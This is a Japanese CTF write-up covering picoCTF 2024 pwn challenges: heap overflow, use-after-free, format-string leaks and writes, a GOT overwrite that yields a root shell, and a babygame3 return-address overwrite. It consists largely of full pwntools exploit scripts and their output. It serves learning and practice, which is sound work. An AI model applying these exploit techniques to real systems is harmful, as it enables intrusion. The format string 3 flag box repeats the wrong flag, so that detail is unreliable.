ヒープの状態をわかりやすく表示してくれる機能とヒープにサイズ無制限で書き込む機能があって至れり尽くせり。

ヒープレイアウトを見ると、33文字以上の文字列を書き込めばOK。

```c
% nc tethys.picoctf.net 61327

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x560649bd12b0  ->   pico
+-------------+----------------+
[*]   0x560649bd12d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x55b03af632b0  ->   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+-------------+----------------+
[*]   0x55b03af632d0  ->   A
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_0c473fe8}
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{my_first_heap_overflow_0c473fe8}

</aside>

### heap 1

<img src="/img/2024/03-27/Untitled%2051.png" width="550px" height="auto"> 

heap 0 と考え方は一緒。今回はオーバーフローして後続領域を壊すのではなく、後続領域を “pico” と書き換える。

```bash
% nc tethys.picoctf.net 57621

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x55c6dc58c2b0  ->   pico
+-------------+----------------+
[*]   0x55c6dc58c2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3

Take a look at my variable: safe_var = pico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_c588b8a1}
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{starting_to_get_the_hang_c588b8a1}

</aside>

### heap 2

<img src="/img/2024/03-27/Untitled%2052.png" width="550px" height="auto"> 

`x` を win() のアドレスで書き換えれば勝ち。

No PIEなのでwin()のアドレスはgdbなどで静的に取れる → 0x4011a0

以下のコードでOK。

```python
## Run local executable.
##   ./exploit.py LOCAL EXE=./executable
#
## Run remote (with local executable for addresses)
##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable
#
## Run with GDB script.
##   ./exploit.py GDB
## --- (Edit GDB script if necessary) --------------------------------
gdbscript = """
b check_win
p win
b print_menu
c
""".format(
    **locals()
)
## -------------------------------------------------------------------

from pwn import *

## --- (do not edit) ---------------------------------------------------
exe = context.binary = ELF(args.EXE)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    host = args.HOST
    port = int(args.PORT)
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()
## -----------------------------------------------------------------------

## EXPLOIT GOES HERE

win_addr = p32(0x4011A0)
## win_addr = b'B'

## write buffer
io.sendlineafter(b"Enter your choice: ", b"2")
io.sendlineafter(b"Data for buffer: ", b"A" * 32 + win_addr)

## print x
io.sendlineafter(b"Enter your choice: ", b"3")
io.recvline()
io.recvline()
print(io.recvline())

## print flag
io.sendlineafter(b"Enter your choice: ", b"4")
print(io.recvline())

io.interactive()
io.close()

```

実行する。

```bash
% python exploit.py EXE=./chall HOST=mimas.picoctf.net PORT=57777
[*] '/home/laysakura/share/picoCTF2024/pwn/435-heap-2/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to mimas.picoctf.net on port 57777: Done
b'x = \xa0\x11@\n'
b'picoCTF{and_down_the_road_we_go_dbb7ff66}\n'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{and_down_the_road_we_go_dbb7ff66}

</aside>

### heap 3

<img src="/img/2024/03-27/Untitled%2053.png" width="550px" height="auto"> 

Use-after-free が使える。以下の戦略。

1. Free x を呼び出し、xの指すアドレスをfreelistに載せる。
2. Allocate objectでmalloc。上記元 x のアドレスが確保される。その領域の30~35バイト目に  `"pico\0"` の文字列をセット。
3. Check for win で `x->flag` を参照。上記の `"pico\0"` が参照されて勝ち。

```python
## Run local executable.
##   ./exploit.py LOCAL EXE=./executable
#
## Run remote (with local executable for addresses)
##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable
#
## Run with GDB script.
##   ./exploit.py GDB
## --- (Edit GDB script if necessary) --------------------------------
gdbscript = """
b check_win
p win
b print_menu
c
""".format(
    **locals()
)
## -------------------------------------------------------------------

from pwn import *

## --- (do not edit) ---------------------------------------------------
exe = context.binary = ELF(args.EXE)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    host = args.HOST
    port = int(args.PORT)
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()
## -----------------------------------------------------------------------

## EXPLOIT GOES HERE

win_addr = p32(0x4011A0)

## Free x
io.sendlineafter(b"Enter your choice: ", b"5")

## Allocate object
io.sendlineafter(b"Enter your choice: ", b"2")
io.sendlineafter(b"Size of object allocation: ", b"35")
io.sendlineafter(b"Data for flag: ", b"pico\0" * 7)

## Check for win
io.sendlineafter(b"Enter your choice: ", b"4")
print(io.recvline())
print(io.recvline())

io.interactive()
io.close()
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{now_thats_free_real_estate_a11cf359}

</aside>

### format string 1

<img src="/img/2024/03-27/Untitled%2054.png" width="550px" height="auto"> 

普通の書式文字列攻撃でスタック上のフラグをリーク。なんでこんなにLiked低いんだろう？

解き方は↓に解説してあるものそのまま使える。

[テンプレ: 書式文字列攻撃 (Format String Attack) でスタック上の文字列を復元](https://laysakura.notion.site/CTF-pwn-reverse-e0fd38c4a24040679c0e45eed3c8d7ab#bf9ae57474be42a1b0628b2193b7d2b2)

スクリプト↓

```python
## Run local executable.
##   ./exploit.py LOCAL EXE=./executable
#
## Run remote (with local executable for addresses)
##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable
#
## Run with GDB script.
##   ./exploit.py GDB
## --- (Edit GDB script if necessary) --------------------------------
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)
## -------------------------------------------------------------------

from pwn import *

## --- (do not edit) ---------------------------------------------------
if args.EXE:
    exe = context.binary = ELF(args.EXE)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    host = args.HOST
    port = int(args.PORT)
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()
## -----------------------------------------------------------------------

## EXPLOIT GOES HERE

## 書式文字列攻撃 (スタックのリーク)

## param: printfの何番目の引数（=~ スタックポインタの何個上のワード）から、
offset = 0
## param: 何番目の引数までのアドレスを出力するか
num = 300

payload = ",".join([f"%{i}$p" for i in range(offset, offset + num)])

## param: バナー
io.sendlineafter(
    b"Give me your order and I'll read it back to you:\n",
    payload,
)

retstr = io.recvline().decode().split("Here's your order:")[-1]

## 出力されたアドレスをASCIIに変換して表示
addresses = retstr.split(",")
for address in addresses:
    if address.startswith("0x"):
        decoded = unhex(address.strip()[2:])
        reversed_hex = decoded[::-1]
        print(str(reversed_hex))

io.interactive()
io.close()

```

これを↓で実行する。

```python
% python exploit.py HOST=mimas.picoctf.net PORT=64526 EXE=./format-string-1
```

出力に

```python
b'picoCTF{'
b'4n1m41_5'
b'7y13_4x4'
b'_f14g_b5'
b'd7b98f}'
```

の箇所がある。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{4n1m41_57y13_4x4_f14g_b5d7b98f}

</aside>

### format string 2

<img src="/img/2024/03-27/Untitled%2055.png" width="550px" height="auto"> 

問題のコードは↓。

```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];

  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

`printf(buf);` の行が書式文字列できる。

書式文字列攻撃で `sus` を 0x67616c66 に書き換えるのがゴール。

解き方は↓

[テンプレ: 書式文字列攻撃で（戻り値アドレスなど）任意の領域を書き換える](https://laysakura.notion.site/CTF-pwn-reverse-e0fd38c4a24040679c0e45eed3c8d7ab#76a5dedf5ccb405990a012f0c1de1b6e)

---

[fmtstr_payload(offset, {addr: value})](https://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload) に渡す引数を探る。

- offset: 14
    - 下記「実行結果1」で、14番目の %p が `0x70252c70252c7025 (= "%p,%p,%p" のリトルエンディアン)` となっているため
- addr: 0x401273 + 0x2de7 + 0x6
    - checksec 結果が No PIE になっているので固定アドレス。
    - 下記「ディスアセンブル結果」の `*main + 125` のアドレス (rip = 0x0000000000401273) にて、 `sus` の値を取得するときに `rip+0x2de7` としているから。
    - 最後の +0x6 は `"sus = 0x%x\\n"` の出力を見ながらの試行錯誤…
- value: 0x67616c66

```bash
## 実行結果1
% ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
Here's your input: 0x7ffcc929a200,(nil),(nil),0x54,0x7f1f55b4baa0,0x7f1f55ba7658,0x7ffc00000000,0x7f1f55ba72d0,0xffffffff,0x7f1f55b747b0,0x7f1f55ba6ab0,0x1,0x7ffcc929a510,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x2c70252c,0x7f1f55b82f08,0x7f1f55b72140,0xffffffff,0x7ffcc929a4e0,
sus = 0x21737573
You can do better!
```

ということで、↓のコードを書く。

```bash
## Run local executable.
##   ./exploit.py LOCAL EXE=./executable
#
## Run remote (with local executable for addresses)
##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable
#
## Run with GDB script.
##   ./exploit.py GDB
## --- (Edit GDB script if necessary) --------------------------------
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)
## -------------------------------------------------------------------

from pwn import *

## --- (do not edit) ---------------------------------------------------
exe = context.binary = ELF(args.EXE)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    host = args.HOST
    port = int(args.PORT)
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()
## -----------------------------------------------------------------------

## EXPLOIT GOES HERE

## 書式文字列攻撃 (任意アドレスの値書き換え)

## param: printf()に "%p,%p,..." を渡したときに、何番目の %p (1-origin) が `0x70252c70252c7025` (= "%p,%p,%p" のリトルエンディアン) となるか
offset = 14
## param: 書き換えたいアドレス
addr = 0x401273 + 0x2DE7 + 0x6  # 最後の +0x6 は、 `"sus = 0x%x\n"` の出力を見ながらの試行錯誤
## param: 書き換えたい値
value = p32(0x67616C66)

payload = fmtstr_payload(offset, {addr: value})
log.info(f"payload: {payload}")

## param: バナー
io.sendlineafter(
    b"You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n",
    payload,
)

print(io.recvall())
io.interactive()
io.close()
```

実行してフラグゲット。

```bash
% python exploit.py HOST=rhea.picoctf.net PORT=65080 EXE=./vuln
[*] '/home/laysakura/share/picoCTF2024/pwn/448-format-string-2/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to rhea.picoctf.net on port 65080: Done
[*] payload: b'%97c%19$hhn%5c%20$hhnc%21$hhn%5c%22$hhnab@@\x00\x00\x00\x00\x00`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00'
[+] Receiving all data: Done (242B)
[*] Closed connection to rhea.picoctf.net port 65080
b"Here's your input:                                                                                                 u    \x00c    \x00ab@@\nI have NO clue how you did that, you must be a wizard. Here you go...\npicoCTF{f0rm47_57r?_f0rm47_m3m_99fd82cd}"
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{f0rm47_57r?_f0rm47_m3m_99fd82cd}

</aside>

### format string 3

<img src="/img/2024/03-27/Untitled%2056.png" width="550px" height="auto"> 

添付されているのは

- 実行ファイル
- Cソースコード
- libc.so.6
- ld-linux-x86-64.so.2

ソースコードはこれ。

```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}
```

---

以下、方針。

1. GOT Overwriteで、printf() の直後に呼び出される puts() のアドレスを system() 関数のアドレスに書き換える（書式文字列攻撃 + GOT Overwrite）
    1. system() の引数はコード中の `normal_string` の “/bin/sh” がそのまま使える

---

[fmtstr_payload(offset, {addr: value})](https://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload) に渡す引数を探る。

- offset: 38
    - 下記「実行結果1」で、38番目の %p が `0x70252c70252c7025 (= "%p,%p,%p" のリトルエンディアン)` となっているため
- addr: 0x404018
    - 下記「実行結果2」で、PLTにおける puts() のアドレスが 0x404018 とわかるので
- value: （libcの中のsystem関数のアドレスを実行時に特定）

```bash
## 実行結果1
% ./format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f0e6380a3f0
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
0x7f0e63968963,0xfbad208b,0x7ffdfd22aa00,0x1,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0xa,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),0xcc5ba3e9a9567f00,0x1,
/bin/sh
```

```bash
## 実行結果2
% readelf -r format-string-3

Relocation section '.rela.dyn' at offset 0x15d8 contains 6 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000403fe8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0
000000403ff0  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000403ff8  000800000006 R_X86_64_GLOB_DAT 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
000000404060  000700000005 R_X86_64_COPY     0000000000404060 stdout@GLIBC_2.2.5 + 0
000000404070  000900000005 R_X86_64_COPY     0000000000404070 stdin@GLIBC_2.2.5 + 0
000000404080  000a00000005 R_X86_64_COPY     0000000000404080 stderr@GLIBC_2.2.5 + 0

Relocation section '.rela.plt' at offset 0x1668 contains 4 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000404020  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
000000404028  000400000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000404030  000500000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0
```

---

攻撃コードは以下。

```python
## Run local executable.
##   ./exploit.py LOCAL EXE=./executable
#
## Run remote (with local executable for addresses)
##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable
#
## Run with GDB script.
##   ./exploit.py GDB
## --- (Edit GDB script if necessary) --------------------------------
gdbscript = """
b *main+160
c
p system
p $rbp
x/5gx $rbp+8
""".format(
    **locals()
)
## -------------------------------------------------------------------

from pwn import *

## --- (do not edit) ---------------------------------------------------
exe = context.binary = ELF(args.EXE)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    host = args.HOST
    port = int(args.PORT)
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()
## -----------------------------------------------------------------------

## EXPLOIT GOES HERE

libc = ELF("./libc.so.6")

## 1. system関数のアドレスを取得
io.recvline()
setbuf_addr_line = io.recvline().decode("utf-8").rstrip()
log.info(setbuf_addr_line)
setbuf_addr_str = setbuf_addr_line.split(
    "Okay I'll be nice. Here's the address of setvbuf in libc: "
)[-1]
servbuf_addr = int(setbuf_addr_str[2:], 16)
log.info(f"setvbuf() address: {hex(servbuf_addr)}")

libc_base = servbuf_addr - libc.symbols["setvbuf"]
system_addr = libc_base + libc.symbols["system"]
log.info(f"system()  address: {hex(system_addr)}")

## 2. 書式文字列攻撃 (任意アドレスの値書き換え + GOT Overwrite)

## param: printf()に "%p,%p,..." を渡したときに、何番目の %p (1-origin) が `0x70252c70252c7025` (= "%p,%p,%p" のリトルエンディアン) となるか
offset = 38
## param: 書き換えたいアドレス
addr = 0x404018
## param: 書き換えたい値
value = p64(system_addr)

payload = fmtstr_payload(offset, {addr: value})
log.info(f"payload: {payload}")

io.sendline(payload)

io.interactive()
io.close()

```

実行してシェルを奪い、フラグゲット。

```bash
% python exploit.py EXE=./format-string-3 HOST=rhea.picoctf.net PORT=65378
[*] '/home/laysakura/share/picoCTF2024/pwn/449-format-string-3/format-string-3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
[+] Opening connection to rhea.picoctf.net on port 65378: Done
[*] '/home/laysakura/share/picoCTF2024/pwn/449-format-string-3/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f94fee023f0
[*] setvbuf() address: 0x7f94fee023f0
[*] system()  address: 0x7f94fedd7760
[*] payload: b'%96c%47$lln%23c%48$hhn%8c%49$hhn%21c%50$hhn%73c%51$hhn%33c%52$hhnaaaabaa\x18@@\x00\x00\x00\x00\x00\x19@@\x00\x00\x00\x00\x00\x1d@@\x00\x00\x00\x00\x00\x1c@@\x00\x00\x00\x00\x00\x1a@@\x00\x00\x00\x00\x00\x1b@@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
                                                                                               c                      \x8b       \xd0                                                                                            \x00                                \x00aaaabaa\x18id
uid=0(root) gid=0(root) groups=0(root)
$ ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$ cat flag.txt
picoCTF{G07_G07?_f574d38f}
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{f0rm47_57r?_f0rm47_m3m_99fd82cd}

</aside>

### babygame3

<img src="/img/2024/03-27/Untitled%2057.png" width="550px" height="auto"> 

めちゃくちゃ苦労した… 試行錯誤で解いた感じで、未だにアドレス計算がなんでこうなったか分かりきってない。

解法がやや複雑なので予め要約すると「いい感じのアドレスにプレイヤーを移動させて、プレイヤー文字を上書きしたい1バイトにセットして move_player を呼ぶことで、move_player の戻り値アドレスを好きな飛ばし先に書き換える」感じ。

なお、main → move_player → solve_round → move_player のコールチェーンで solve_round のアドレスを win のアドレスに書き換える戦略を取った人もいるかと思うが、それやるとwin関数の中で `level != 5` となってしまってフラグがprintされない（1敗）。

---

move_player() 関数をGhidraで逆コンパイルし、自分なりにわかりやすく変数名を付けたりしたのが↓。

<img src="/img/2024/03-27/Untitled%2058.png" width="550px" height="auto"> 

42行目がミソで、

- プレイヤーのx, y座標を動かすことで、 `map + x + 0x5a * y` のアドレスの値を
- player_tile の1バイトに置き換えられる

player_tileは `l` コマンドで書き換えられる。

---

次にmain関数を見る。

<img src="/img/2024/03-27/Untitled%2059.png" width="550px" height="auto"> 

28, 35行目の条件分岐が大変厄介。

35行目は「Level 5じゃないとwinさせない」と言っているのに、28行目では「Level 4の場合は次のレベルに進ませない」と言っている。

これらの条件分岐をbypassしたい。

---

以下の戦略とする。

1. ゲームの `l` コマンドによって任意の1バイトを書き換えられる。
2. main関数からmove_player関数を呼び出す際に、main関数への戻りアドレスを少し弄り、条件分岐をbypassするようにする。

---

より具体的には、

1. `aaaaaaaawwwwsp` を3回繰り返し、普通にLevel4になる
2. move_player を呼び出す。ただし、その戻り値をただのmain関数 (0x0804992c) から、 `puts(”You win!...");` の場所 (0x08049970) に上書きする
    1. move_playerを `l`コマンドで呼び出すのはNG。move_player L23 の命令でプレイヤー位置 0x2e に上書きされてしまう
3. move_player を呼び出す。ただし、その戻り値をただのmain関数から、  `win(&level)`  の場所 (0x080499fe)に上書きする

---

以上の方針で書いたコードが以下。何回移動するかはメモリダンプとにらめっこしながら試行錯誤した（本当は綺麗に求まるはずだけど何故かずれてしまい…）。

```python
## Run local executable.
##   ./exploit.py LOCAL EXE=./executable
#
## Run remote (with local executable for addresses)
##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable
#
## Run with GDB script.
##   ./exploit.py GDB
## --- (Edit GDB script if necessary) --------------------------------
gdbscript = """
#b *main+182
b *move_player+89
#b solve_round
c 4
b *move_player+351
c
""".format(
    **locals()
)
## -------------------------------------------------------------------

from pwn import *

## --- (do not edit) ---------------------------------------------------
exe = context.binary = ELF(args.EXE)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    host = args.HOST
    port = int(args.PORT)
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()
## -----------------------------------------------------------------------

## EXPLOIT GOES HERE

## Level 4まで行く
io.sendline(b"aaaaaaaawwwwsp" * 3)

## ---- Level 4 ----
## lifeを大きくする; (x, y) = (-4, 0)
io.sendline(b"a" * 8 + b"w"*4)

## 次に呼び出す move_player にとっての戻り値アドレスを、
## `puts(”You win!...` のものに書き換える
## （スタック破壊しないように低位アドレスを迂回）
io.sendline(b"w"*3 + b'd'*0x2b + b's'*1 + b'l\x70' + b's')

## ---- Level 5 ----
## lifeを大きくする; (x, y) = (-4, 0)
io.sendline(b"a" * 8 + b"w"*4)

## 次に呼び出す move_player にとっての戻り値アドレスを、
## `win(&level)` のものに書き換える
## （スタック破壊しないように低位アドレスを迂回）
io.sendline(b"w"*3 + b'd'*0x1b + b's'*1 + b'l\xfe' + b's')

io.interactive()
io.close()
```

---

これを実行してフラグゲット。

